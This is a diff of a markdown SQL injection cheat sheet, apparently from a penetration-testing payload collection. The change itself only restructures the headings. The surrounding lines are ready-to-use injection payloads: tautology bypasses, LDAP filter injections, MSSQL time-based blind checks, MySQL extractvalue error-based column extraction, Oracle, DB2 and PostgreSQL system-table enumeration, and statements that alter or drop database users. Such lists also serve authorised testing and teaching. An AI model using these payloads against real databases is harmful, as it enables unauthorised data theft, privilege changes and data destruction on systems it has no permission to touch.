@@ -1,4 +1,6 @@
-# Misc
+# SQL-Inj
+
+## Misc
 ```
 '
 "
@@ -273,7 +275,7 @@ a' or 3=3--
 ' or 3=3
 ```
 
-# ldap
+## ldap
 ```
 !
 %21
@@ -303,7 +305,7 @@ admin*)((|userpassword=*)
 *)(uid=*))(|(uid=*
 ```
 
-# db2
+## db2
 ```sql
 select versionnumber, version_timestamp from sysibm.sysversions;
 select user from sysibm.sysdummy1;
@@ -319,7 +321,7 @@ select name, tbname, coltype from sysibm.syscolumns;
 SELECT schemaname FROM syscat.schemata;
 ```
 
-# MSSQL
+## MSSQL
 
 ```sql
 1'and 1='1
@@ -485,7 +487,7 @@ convert(int,(char(82)%2bchar(33)%2b(select top 1 isnull([ColumnName],char(32)) f
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
 ```
 
-# Mysql
+## Mysql
 
 返回正常说明是MySQL
 ```sql
@@ -571,7 +573,7 @@ and extractvalue(rand(),concat(0x3a,(select concat(0x3a,column_name) from inform
 and extractvalue(rand(),concat(0x3a,(select concat(0x3a,ColumnName1,0x3a,ColumnName2,0x3a,ColumnName3) from TableName)))--
 ```
 
-# ORACLE
+## ORACLE
 ```
 ’ or ‘1’=’1
 ' or '1'='1
@@ -660,7 +662,7 @@ SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username
 SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';
 ```
 
-# postgresql
+## postgresql
 ```sql
 SELECT pg_sleep(10);
 SELECT version()
@@ -698,7 +700,7 @@ ALTER USER HR CREATEUSER CREATEDB;
 DROP USER HR;
 ```
 
-# ACCESS
+## ACCESS
 ```sql
 and (select id from MSysAccessObjects) >0   返回正常说明是access
 ```
